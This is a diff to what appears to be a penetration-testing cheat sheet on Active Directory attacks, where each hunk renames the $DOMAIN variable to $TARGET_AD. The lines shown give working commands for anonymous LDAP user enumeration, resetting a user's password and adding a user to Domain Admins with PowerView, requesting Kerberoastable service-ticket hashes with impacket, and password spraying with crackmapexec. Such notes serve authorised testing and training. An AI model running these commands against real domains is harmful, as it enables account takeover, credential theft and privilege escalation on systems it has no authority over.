@@ -43,11 +43,11 @@ ldapsearch -H ldap://$TARGET_IP -x -s base namingcontexts
 ```
 
 ```bash
-ldapsearch -x -H ldap://$TARGET_IP -b 'DC=$DOMAIN,DC=$DOMEXT' | grep -B2 Person | grep "@" | awk '{print $2}'
+ldapsearch -x -H ldap://$TARGET_IP -b 'DC=$TARGET_AD,DC=$DOMEXT' | grep -B2 Person | grep "@" | awk '{print $2}'
 ```
 
 ```bash
-ldapsearch -H ldap://$TARGET_IP -x -b "DC=$DOMAIN,DC=local" '(objectClass=person)'
+ldapsearch -H ldap://$TARGET_IP -x -b "DC=$TARGET_AD,DC=local" '(objectClass=person)'
 ```
 
 AS-REP Roasting
@@ -118,8 +118,8 @@ Change user password using powershell / powerview:
 #change-password
 ```powershell
 . ./PowerView.ps1
-Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force) -Domain $DOMAIN
-Add-NetGroupUser -UserName $USER -GroupName "Domain Admins" -Domain $DOMAIN
+Set-DomainUserPassword -Identity $USERNAME -AccountPassword (ConvertTo-SecureString -AsPlainText 'Password123!' -Force) -Domain $TARGET_AD
+Add-NetGroupUser -UserName $USER -GroupName "Domain Admins" -Domain $TARGET_AD
 ```
 
 Pre-compiled Windows binaries (Rubeus, Certify …):
@@ -138,13 +138,13 @@ The attacker impersonates an account user with a service principal name (SPN) an
 Check if vulnerable accounts are present:
 
 ```shell
-impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER
+impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_AD/$USER
 ```
 
 Send request to TGS and extract the hash:
 
 ```shell
-impacket-GetUserSPNs -dc-ip $TARGET_IP $DOMAIN/$USER -request
+impacket-GetUserSPNs -dc-ip $TARGET_IP $TARGET_AD/$USER -request
 ```
 
 #kerberoasting #rubeus
@@ -227,7 +227,7 @@ crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD --users | grep "$TARGET_AD" | 
 Password spraying with CME
 
 ```shell
-crackmapexec smb $DOMAIN -u users -p $PASS --continue-on-success
+crackmapexec smb $TARGET_AD -u users -p $PASS --continue-on-success
 ```
 
 Start collecting data for BloodHound:
